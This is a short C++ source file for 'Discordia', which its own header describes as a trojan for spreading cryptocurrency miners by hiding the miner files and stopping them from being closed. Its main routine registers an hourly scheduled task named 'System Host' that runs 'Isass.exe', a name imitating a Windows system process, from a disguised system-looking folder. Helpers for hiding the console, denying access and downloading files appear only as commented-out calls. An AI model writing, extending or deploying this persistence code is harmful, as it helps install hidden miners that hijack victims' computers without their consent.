/*
	# Discordia
	Discordia it's trojan for dissemination miners. Discordia written in C / C++.

	## Features
	* Hiding miner files
	* Prevents closing of miner (Windows 7 and older)
	* 

	## Author
	Alexandr Foxovsky (foxovsky.me)

*/
#include "stdafx.h"
#include "Utils.h"

#include <Windows.h>
#include <WindowsX.h>


using namespace std;

Utils utils;

int main(int argc, char* argv[])
{
	//utils.HideConsole();
	//utils.DenyAccess();

	system("powershell.exe SCHTASKS.exe /Create /SC HOURLY /TN \"System Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");

	std::cin.get();
    return 0;
}

void RestoreFiles()
{
	//utils.DownloadFile();
}